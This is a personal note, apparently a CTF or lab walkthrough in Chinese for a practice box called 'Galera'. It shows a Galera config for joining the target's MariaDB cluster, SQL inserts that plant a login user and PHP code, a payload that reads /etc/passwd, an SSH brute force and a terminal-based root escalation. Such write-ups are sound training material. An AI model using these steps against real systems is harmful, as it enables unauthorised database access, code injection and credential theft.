---
UID: 20250608210639
aliases: 
tags:
  - 靶场
  - 打靶
source: 
cssclasses: 
created: 2025-06-08
---

# hackvm
##  Galera
### 端口扫描
![image.png](https://s2.loli.net/2025/06/08/jqxkFzlLEiNypto.png)

### web 信息收集
主页是个登录界面
![image.png](https://s2.loli.net/2025/06/08/7vn6U4IzFEhqlVt.png)

首先先排除了爆破破解，第一感觉肯定没啥用。万能密码测试也没用。都是同个报错，没法 sql 注入

子目录扫描
![image.png](https://s2.loli.net/2025/06/08/6gpCGwR23Pra5T4.png)

有蛮多的 php
![image.png](https://s2.loli.net/2025/06/08/LZq6OaeGufVKP2X.png)

有 upload 的目录，但进去没有回显，应该是在别的地方上传

另外我们得知了 php 的版本是 PHP Version 8.2.28
![image.png](https://s2.loli.net/2025/06/08/MXL7fF5Ql9n4GxP.png)

### 无思路
看了 wp，发现要用到新的端口，galera，mysql 的一个插件
需要在 mysql 的 my. cnf 中配置 galera 的节点
```
[mysqld]
# 基础配置
binlog_format=ROW
default-storage-engine=InnoDB
innodb_autoinc_lock_mode=2
bind-address=0.0.0.0  # 允许远程访问（生产环境应限制IP）

# Galera 配置
wsrep_on=ON
wsrep_provider=/usr/lib/galera/libgalera_smm.so
wsrep_cluster_address="gcomm://192.168.56.105"被攻击者者
wsrep_node_address="192.168.56.104" 攻击者
wsrep_node_name="nodeX"
wsrep_sst_method=rsync

```

配置完之后，重启 mariadb。进入数据库，就能找到新的数据库 galeradb

![image.png](https://s2.loli.net/2025/06/08/AIpgdt4BfGjuDUC.png)

![image.png](https://s2.loli.net/2025/06/08/QBIXwlGydKV9oYF.png)

![image.png](https://s2.loli.net/2025/06/08/HAlw6v9FIo58ih4.png)

增加一个新用户
![image.png](https://s2.loli.net/2025/06/08/rK8UjpBNtY3nZJ7.png)

```
insert into users values(3,'tt','test@test.com','$2a$10$Jc71GQZA7tX00V4kQR/vkODsjGKm6eOksBRdDMoUR7w0dosd.ilzu','2025-06-08 07:55:51');
```
![image.png](https://s2.loli.net/2025/06/08/jsg8Tf4HGAzd69p.png)

登录成功
![image.png](https://s2.loli.net/2025/06/08/JfP9cjQzgAp8ibd.png)

### 依旧无思路
看了 wp，需要在 mysql 中插入 php 执行代码
```
insert into users values(2,'tt','<?php phpinfo();?>','$2a$10$Jc71GQZA7tX00V4kQR/vkODsjGKm6eOksBRdDMoUR7w0dosd.ilzu','2025-06-08 07:55:51');

insert into users values(23,'tt1','<?php echo include(''php://filter/convert.base64-encode/resource=/etc/passwd'');?>','$2a$10$Jc71GQZA7tX00V4kQR/vkODsjGKm6eOksBRdDMoUR7w0dosd.ilzu','2025-06-08 07:55:51');
```

![image.png](https://s2.loli.net/2025/06/08/EHSqPuQkUzFMarI.png)


![image.png](https://s2.loli.net/2025/06/08/qW6VTG8Ff715EBy.png)

找到/etc/passwd 的 base 64 编码
![image.png](https://s2.loli.net/2025/06/08/DgftTaS8oZAXHbw.png)

找到一个 donjuandeaustria 用户，尝试进行密码爆破 ssh

#### hydra 爆破
![image.png](https://s2.loli.net/2025/06/08/bAuEM7vqJDVcTm6.png)

找到密码

#### 提权
![image.png](https://s2.loli.net/2025/06/08/ZUpiP7JQRIWhexN.png)

看了 wp

输入 w
w命令的核心功能是显示当前登录用户信息和系统负载状态
![image.png](https://s2.loli.net/2025/06/08/I8F7DNOorbJXMlm.png)

tty是 Linux 中终端设备的统称
`tty20` 表示用户 `root` 当前登录的是系统的​**​第 20 个虚拟终端（Virtual Console）**

在/dev 中找带 20 的
![image.png](https://s2.loli.net/2025/06/08/1impb7jUnV5YTJs.png)


![image.png](https://s2.loli.net/2025/06/08/psW7TDkKPFNfaAJ.png)

![image.png](https://s2.loli.net/2025/06/08/Vp6sDP5Bt9UxbTy.png)


![image.png](https://s2.loli.net/2025/06/08/Zd9Gs8Lv1BQSAXU.png)


# vulnyx


